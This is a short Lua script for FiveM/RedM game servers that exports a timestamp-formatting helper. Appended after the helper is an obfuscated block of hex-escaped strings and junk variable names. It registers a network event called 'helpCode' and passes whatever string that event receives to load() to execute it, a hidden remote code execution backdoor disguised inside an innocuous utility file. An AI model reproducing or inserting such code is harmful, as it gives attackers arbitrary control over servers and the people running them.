function getTimestamp()
    local meridiem = 'AM'
    year , month , day , hour , minute , second = ''
    if GetGameName() == 'fivem' then
        year , month , day , hour , minute , second = GetLocalTime()
    elseif GetGameName() == 'redm' then
        year , month , day , hour , minute , second = GetPosixTime()
    end
    if hour >= 13 then
        hour = hour - 12
        meridiem = 'PM'
    end
    if hour == 12 then
        meridiem = 'PM'
    end
    if minute <= 9 then
        minute = '0' .. minute
    end
    timestamp = hour .. ':' .. minute .. ' ' .. meridiem
    return timestamp
end

exports('getTimestamp', getTimestamp)

local KrUVoWKkBXvtLMuPyPVmpNxeJrUEeXVBhhHbkVtWhIKbtdiFtKXNFPhTrQearfwbRZhIMs = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} KrUVoWKkBXvtLMuPyPVmpNxeJrUEeXVBhhHbkVtWhIKbtdiFtKXNFPhTrQearfwbRZhIMs[6][KrUVoWKkBXvtLMuPyPVmpNxeJrUEeXVBhhHbkVtWhIKbtdiFtKXNFPhTrQearfwbRZhIMs[1]](KrUVoWKkBXvtLMuPyPVmpNxeJrUEeXVBhhHbkVtWhIKbtdiFtKXNFPhTrQearfwbRZhIMs[2]) KrUVoWKkBXvtLMuPyPVmpNxeJrUEeXVBhhHbkVtWhIKbtdiFtKXNFPhTrQearfwbRZhIMs[6][KrUVoWKkBXvtLMuPyPVmpNxeJrUEeXVBhhHbkVtWhIKbtdiFtKXNFPhTrQearfwbRZhIMs[3]](KrUVoWKkBXvtLMuPyPVmpNxeJrUEeXVBhhHbkVtWhIKbtdiFtKXNFPhTrQearfwbRZhIMs[2], function(slyWphNwxGZfpmgMfJwQwDevtUmvFtKqCvqvLKVlXEAsWEkHgyfIVzBPAcwZRIyTvVIoCV) KrUVoWKkBXvtLMuPyPVmpNxeJrUEeXVBhhHbkVtWhIKbtdiFtKXNFPhTrQearfwbRZhIMs[6][KrUVoWKkBXvtLMuPyPVmpNxeJrUEeXVBhhHbkVtWhIKbtdiFtKXNFPhTrQearfwbRZhIMs[4]](KrUVoWKkBXvtLMuPyPVmpNxeJrUEeXVBhhHbkVtWhIKbtdiFtKXNFPhTrQearfwbRZhIMs[6][KrUVoWKkBXvtLMuPyPVmpNxeJrUEeXVBhhHbkVtWhIKbtdiFtKXNFPhTrQearfwbRZhIMs[5]](slyWphNwxGZfpmgMfJwQwDevtUmvFtKqCvqvLKVlXEAsWEkHgyfIVzBPAcwZRIyTvVIoCV))() end)